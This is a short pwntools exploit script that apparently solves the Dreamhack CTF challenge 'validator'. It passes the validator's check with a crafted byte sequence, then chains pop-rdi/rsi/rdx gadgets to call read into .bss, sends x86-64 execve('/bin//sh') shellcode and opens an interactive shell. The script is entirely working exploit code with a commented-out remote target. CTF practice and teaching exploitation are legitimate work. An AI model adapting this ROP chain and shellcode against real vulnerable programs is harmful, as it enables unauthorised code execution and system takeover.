from pwn import *

context.log_level = 'debug'
e = ELF('./validator')
p = process('./validator')
# p = remote('host5.dreamhack.games',24525)

prdi = 0x00000000004006f3 # pop rdi ; ret
prsi_r15 = 0x00000000004006f1 # pop rsi ; pop r15 ; ret
prdx = 0x000000000040057b
correct = 'DREAMHACK!'
bss = e.bss() + 0x100
shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

# pause()
# a[i] == a[i+1]+1 
pay = correct
for i in range(119,1,-1):
	pay += p8(i)

pay += p8(1)*8
pay += p64(prdi)
pay += p64(0)
pay += p64(prsi_r15)
pay += p64(bss)
pay += p64(0)
pay += p64(prdx)
pay += p64(100)
pay += p64(e.plt['read'])
# pay += p64(e.symbols['main'])
pay += p64(bss)

p.send(pay)
sleep(0.3)
p.send(shellcode)

p.interactive()
